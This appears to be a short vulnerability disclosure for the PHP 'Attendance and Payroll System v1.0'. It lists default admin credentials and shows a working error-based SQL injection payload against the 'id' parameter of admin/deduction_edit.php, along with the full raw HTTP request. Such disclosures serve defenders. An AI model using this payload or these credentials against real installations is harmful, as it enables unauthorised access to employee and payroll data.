Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\deduction_edit.php has SQL injection

Payload: id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&description=PhilHealth&amount=150&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159259387-40e8bf5e-7297-4222-96da-299244646354.png)

```sql
POST /apsystem/admin/deduction_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/deduction.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&description=PhilHealth&amount=150&edit=
```
![image](https://user-images.githubusercontent.com/54017627/159261257-56e82ae3-8ff1-4305-8b9a-b283201b50ef.png)

![image](https://user-images.githubusercontent.com/54017627/159261164-dd50b65b-48fb-467b-a2c5-bf4ec5d0e75b.png)

